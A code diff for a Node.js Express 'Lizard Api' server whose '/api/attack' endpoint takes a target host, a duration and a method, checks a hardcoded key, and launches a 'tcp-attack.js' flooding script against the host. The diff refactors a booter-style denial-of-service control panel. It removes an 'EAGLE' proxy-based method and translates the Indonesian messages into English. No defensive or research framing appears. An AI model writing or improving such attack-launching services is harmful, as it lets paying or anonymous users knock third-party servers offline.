@@ -1,4 +1,3 @@
-// LIZARD APIs
 const express = require('express');
 
 const app = express();
@@ -8,30 +7,37 @@ const key = "@lizardpredator";
 
 app.get('/api/attack', (req, res) => {
   try {
-    const key = req.query.key;  
+    const keyFromQuery = req.query.key;
     const host = req.query.host;
-    const time = parseInt(req.query.time);
+    const time = parseInt(req.query.time, 10);
     const method = req.query.method;
 
-    if (req.query.key !== key) {
+    if (keyFromQuery !== key) {
       return res.status(401).send('Key not working');
     }
 
-    if (method === 'EAGLE') {
-      const spawn = require('child_process').spawn;
-      const ls = spawn('node', ['eagle.js', host, time, '100', '1000', 'proxy.txt']);
+    if (!host || isNaN(time) || method !== 'TCP-ATTACK') {
+      return res.status(400).send('Invalid parameters or method');
+    }
 
-      ls.stdout.on('data', (data) => {
+    // Only handle the TCP-ATTACK method
+    if (method === 'TCP-ATTACK') {
+      const spawn = require('child_process').spawn;
+      const args = [host, time, '1', '1']; // Updated arguments
+
+      const child = spawn('node', ['tcp-attack.js', ...args]);
+
+      child.stdout.on('data', (data) => {
         console.log(`stdout: ${data}`);
       });
 
-      ls.stderr.on('data', (data) => {
+      child.stderr.on('data', (data) => {
         console.error(`stderr: ${data}`);
       });
 
-      ls.on('close', (code) => {
+      child.on('close', (code) => {
         console.log(`child process exited with code ${code}`);
-        if (code === 0) { 
+        if (code === 0) {
           const html = `
             <html>
               <body>
@@ -44,48 +50,18 @@ app.get('/api/attack', (req, res) => {
           `;
           res.send(html);
         } else {
-          console.error('Terjadi kesalahan selama pelaksanaan proses..');
-          res.status(500).send('Terjadi kesalahan selama pelaksanaan proses..');
+          res.status(500).send('An error occurred during process execution');
         }
       });
-    } else if (method === 'TCP-ATTACK') {
-      const spawn = require('child_process').spawn;
-      const ls = spawn('node', ['tcp-attack.js', host, time, '1024', '10']);
 
-      ls.stdout.on('data', (data) => {
-        console.log(`stdout: ${data}`);
+      child.on('error', (err) => {
+        console.error('Failed to start subprocess:', err);
+        res.status(500).send('Failed to start subprocess');
       });
-
-      ls.stderr.on('data', (data) => {
-        console.error(`stderr: ${data}`);
-      });
-
-      ls.on('close', (code) => {
-        console.log(`child process exited with code ${code}`);
-        if (code === 0) { 
-          const html = `
-            <html>
-              <body>
-                <h1>Lizard Api</h1>
-                <p>Host: ${host}</p>
-                <p>Time: ${time}</p>
-                <p>Method: ${method}</p>
-              </body>
-            </html>
-          `;
-          res.send(html);
-        } else {
-          console.error('Terjadi kesalahan selama pelaksanaan proses..');
-          res.status(500).send('Terjadi kesalahan selama pelaksanaan proses..');
-        }
-      });
-    } else {
-      console.error('Metode yang salah..');
-      res.status(400).send('Metode yang salah..');
     }
   } catch (error) {
     console.error(error);
-    res.status(500).send('Ada masalah.');
+    res.status(500).send('There was a problem.');
   }
 });
 
